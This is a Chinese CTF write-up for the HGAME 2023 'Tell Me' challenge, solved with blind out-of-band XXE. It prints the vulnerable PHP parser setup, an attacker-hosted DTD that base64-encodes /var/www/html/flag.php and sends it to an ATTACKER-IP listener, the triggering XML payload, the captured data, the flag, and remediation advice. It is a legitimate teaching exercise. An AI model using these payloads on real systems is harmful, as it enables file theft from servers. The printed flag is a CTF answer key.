# Tell Me

## 题目简述

站点接收 XML 格式的留言。服务端显式允许加载外部实体，但解析结果没有把实体内容回显到响应中，因此普通 XXE 看不到文件内容。目标是构造带外 XXE，让服务器读取 `flag.php`，再把 Base64 数据作为请求参数回连到自己的监听端。

## 解题过程

服务端的核心行为可以概括为：

```php
libxml_disable_entity_loader(false);
$xmldata = file_get_contents("php://input");
$dom = new DOMDocument();
$dom->loadXML($xmldata, LIBXML_NOENT | LIBXML_DTDLOAD);
$data = simplexml_import_dom($dom);
```

`LIBXML_NOENT | LIBXML_DTDLOAD` 会展开实体并加载外部 DTD，但接口只返回固定的成功或错误提示。于是将实体展开的结果放进外带 URL，而不是等待页面回显。

先在攻击者服务器上放置 `test.dtd`：

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ATTACKER-IP:2333/?p=%file;'>">
```

第二行要在一个参数实体的值中声明另一个参数实体。直接写 `% send` 会被当前 DTD 解析器提前解释，因此把百分号写成字符实体 `&#37;`，展开 `%int;` 后才生成 `%send;` 的声明。

然后向留言接口发送：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://ATTACKER-IP:8000/test.dtd">
  %remote;
  %int;
  %send;
]>
<user>
  <name>guest</name>
  <email>guest@example.com</email>
  <content>hello</content>
</user>
```

解析顺序如下：

1. `%remote;` 下载攻击者控制的 DTD。
2. `%file;` 读取 `/var/www/html/flag.php`，并通过 PHP filter 转成 Base64，避免特殊字符破坏 URL。
3. `%int;` 动态声明 `%send;`。
4. `%send;` 让靶机访问监听端，将文件内容放入查询参数 `p`。

监听端收到的关键参数为：

```text
PD9waHAgDQogICAgJGZsYWcxID0gImhnYW1le0JlX0F3YXJlXzBmX1hYZUJsMW5kMW5qZWN0aTBufSI7DQo/Pg==
```

Base64 解码后得到：

```php
<?php
    $flag1 = "hgame{Be_Aware_0f_XXeBl1nd1njecti0n}";
?>
```

官方 PDF 说明了盲 XXE 和双层参数实体的构造，但没有保留最终回连内容；上面的回连数据与 flag 由参赛者的 [HGAME 2023 Week 4 题解](https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/index.html) 补全。

## 方法总结

没有响应回显不代表 XXE 不可利用。只要解析器允许外部实体且靶机可以出网，就能用外部 DTD 把本地文件编码后带外传出。排查 XML 接口时应同时关注实体展开、DTD 加载、协议处理器和出网能力；修复时应禁用外部实体与网络访问，并避免使用允许 DTD 的解析选项处理不可信 XML。
